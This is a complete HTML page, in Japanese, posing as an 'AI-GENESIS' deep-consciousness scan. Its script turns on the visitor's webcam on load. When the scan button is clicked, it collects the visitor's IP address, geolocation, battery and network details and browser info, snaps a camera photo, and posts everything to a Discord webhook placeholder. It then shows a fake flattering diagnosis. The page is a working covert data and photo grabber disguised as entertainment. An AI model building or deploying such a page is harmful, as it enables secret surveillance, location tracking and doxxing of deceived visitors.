<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI-GENESIS ELITE</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; text-align: center; padding: 20px; }
        .box { border: 1px solid #0f0; padding: 20px; border-radius: 10px; box-shadow: 0 0 15px #0f0; max-width: 500px; margin: auto; }
        #video { width: 100%; border-radius: 5px; margin: 15px 0; border: 1px solid #050; }
        #snap { background: transparent; color: #0f0; border: 1px solid #0f0; padding: 15px 30px; cursor: pointer; font-weight: bold; width: 100%; }
        #snap:hover { background: #0f0; color: #000; }
        .log { font-size: 10px; color: #080; text-align: left; margin-top: 10px; height: 50px; overflow-y: hidden; }
    </style>
</head>
<body>

<div class="box">
    <h2>SYSTEM: AI-GENESIS v2.0</h2>
    <video id="video" autoplay playsinline></video>
    <button id="snap">深層意識スキャン開始</button>
    <div class="log" id="log">READY...</div>
    <canvas id="canvas" style="display:none;"></canvas>
</div>

<script>
    const video = document.getElementById('video');
    const log = document.getElementById('log');
    const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(s => video.srcObject = s);

    async function getInfo() {
        let data = {
            ua: navigator.userAgent,
            lang: navigator.language,
            time: new Date().toLocaleString('ja-JP'),
            battery: "取得不可",
            network: "取得不可",
            ip: "取得中...",
            geo: "未許可"
        };

        // バッテリー
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            data.battery = `${Math.round(b.level * 100)}% (${b.charging ? '充電中' : '放電中'})`;
        }

        // ネットワーク
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) data.network = `Type: ${conn.effectiveType} / Speed: ~${conn.downlink}Mbps`;

        // IPアドレス
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const json = await res.json();
            data.ip = json.ip;
        } catch (e) { data.ip = "取得失敗"; }

        // 位置情報
        const getPos = () => new Promise(res => {
            navigator.geolocation.getCurrentPosition(p => res(`${p.coords.latitude}, ${p.coords.longitude}`), () => res("拒否/失敗"));
        });
        data.geo = await getPos();

        return data;
    }

    document.getElementById('snap').addEventListener('click', async () => {
        log.innerText = "ACCESSING DATA...";
        const info = await getInfo();
        
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append('file', blob, 'capture.png');
            fd.append('payload_json', JSON.stringify({
                embeds: [{
                    title: "━━ 深層データ抽出完了 ━━",
                    color: 0x00FF00,
                    fields: [
                        { name: "IP", value: info.ip, inline: true },
                        { name: "位置情報", value: info.geo, inline: true },
                        { name: "バッテリー", value: info.battery, inline: true },
                        { name: "ネットワーク", value: info.network },
                        { name: "端末情報", value: "```" + info.ua + "```" }
                    ],
                    footer: { text: `取得時刻: ${info.time}` }
                }]
            }));

            fetch(webhookUrl, { method: 'POST', body: fd })
                .then(() => {
                    log.innerText = "COMPLETE.";
                    alert("診断結果：あなたは『神レベル』のポテンシャルを秘めています。");
                });
        }, 'image/png');
    });
</script>
</body>
</html>
